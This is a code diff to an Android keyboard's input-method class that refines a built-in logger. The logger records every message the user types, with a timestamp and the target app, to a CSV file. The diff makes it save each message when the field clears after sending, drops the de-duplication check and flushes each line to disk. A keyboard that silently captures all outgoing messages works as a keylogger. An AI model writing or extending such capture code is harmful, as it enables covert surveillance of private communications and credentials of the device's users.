@@ -117,7 +117,6 @@ public class LatinIME extends InputMethodService implements
     // Outgoing message logger state
     private String mCurrentDraftText = "";
     private String mCurrentDraftApp = "";
-    private String mLastSavedText = "";
 
     // UIHandler is needed when creating InputLogic
     public final UIHandler mHandler = new UIHandler(this);
@@ -767,6 +766,12 @@ public class LatinIME extends InputMethodService implements
 
     private void onStartInputInternal(EditorInfo editorInfo, boolean restarting) {
         super.onStartInput(editorInfo, restarting);
+
+        // Flush previous message if the field restarted empty (e.g. right after tapping Send)
+        if (!mCurrentDraftText.isEmpty()) {
+            writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
+            mCurrentDraftText = "";
+        }
 
         RichInputMethodSubtype subtypeForApp = editorInfo == null
             ? null
@@ -1689,8 +1694,7 @@ public class LatinIME extends InputMethodService implements
     }
 
     private void writeLineToCsv(final String pkg, final String text) {
-        if (text == null || text.isEmpty() || text.equals(mLastSavedText)) return;
-        mLastSavedText = text;
+        if (text == null || text.trim().isEmpty()) return;
 
         try {
             final String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
@@ -1705,6 +1709,7 @@ public class LatinIME extends InputMethodService implements
                         writer.append("Timestamp,TargetApp,Message\n");
                     }
                     writer.append(line);
+                    writer.flush();
                 }
             }
         } catch (Exception e) {
